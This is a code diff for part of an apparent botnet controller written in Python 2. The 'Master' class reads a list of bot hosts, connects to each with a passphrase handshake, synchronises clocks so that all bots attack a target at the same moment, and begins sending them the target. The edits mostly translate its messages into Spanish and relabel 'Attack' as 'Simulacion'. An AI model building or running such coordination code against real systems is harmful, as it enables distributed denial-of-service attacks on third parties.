@@ -14,11 +14,11 @@ order to ensure that all Bots attack exactly at the specified time.
 """
 class Master:
    def __init__(self):
-      print 'Initializing Master...\n'
+      print 'Inicializando controlador...'
 
       # the time to attack, specifed through the delay [secs] from now
       self.atkTime = Util.getCurrTime() + (timeDelay * 1000) 
-      print 'Attack will occur at:', Util.formatTimeMS(self.atkTime), '\n'
+      print 'Simulacion ocurrira en :', Util.formatTimeMS(self.atkTime), '\n'
 
       self.targetStr = str(target[0]) + ':' + str(target[1]) 
 
@@ -34,9 +34,9 @@ class Master:
    Read the Bot info from the bots_list.txt file.
    """
    def readBotsFile(self):
-      print 'Reading Bots file...'
+      print 'Leyendo bots encendidos...'
 
-      with open("bots_list.txt") as botsFile:
+      with open("src/bots_list.txt") as botsFile:
          for line in botsFile:
             host, sep, port = line.partition(":")
             self.bots.append([host.strip(), int(port.strip()), int(0)])
@@ -45,7 +45,7 @@ class Master:
    Output the list of Bots
    """
    def outputBots(self):
-      print '\nCurrent Bots (host:port):'
+      print '\Bots actuales (host:port):'
       
       for i, bot in enumerate(self.bots):
          print "%s:%d" % (bot[0], bot[1])
@@ -57,16 +57,16 @@ class Master:
    """
    def connectToBots(self):
       for i, bot in enumerate(self.bots):
-         print 'Connecting to Bot @ %s:%d...' % (bot[0], bot[1])
+         print 'Conectandose a @ %s:%d...' % (bot[0], bot[1])
          botSocket = socket.socket()
 
          try:
             botSocket.connect((bot[0], bot[1]))
          except socket.error:
-            print 'Unable to connect. Skipping bot.\n'
+            print 'No se ha podido conectar. Skipeando.\n'
             continue
 
-         print 'Connected'
+         print 'Conectado'
 
          # perform handstake
          Util.send(botSocket, Util.MASTER_PASSPHRASE)
@@ -85,9 +85,9 @@ class Master:
          botTime = int(botTime.strip())
          delta = botTime - myTime
 
-         print 'Current time: ' + Util.formatTimeMS(myTime)
-         print 'Bot time: ' + Util.formatTimeMS(botTime)
-         print 'Time difference [ms]: ' + str(delta)
+         print 'Tiempo actual: ' + Util.formatTimeMS(myTime)
+         print 'Tiempo de bot: ' + Util.formatTimeMS(botTime)
+         print 'Tiempo de diferencia [ms]: ' + str(delta)
 
          # tell the bot the target 
          # if we do not add the delta, then we would notice that some
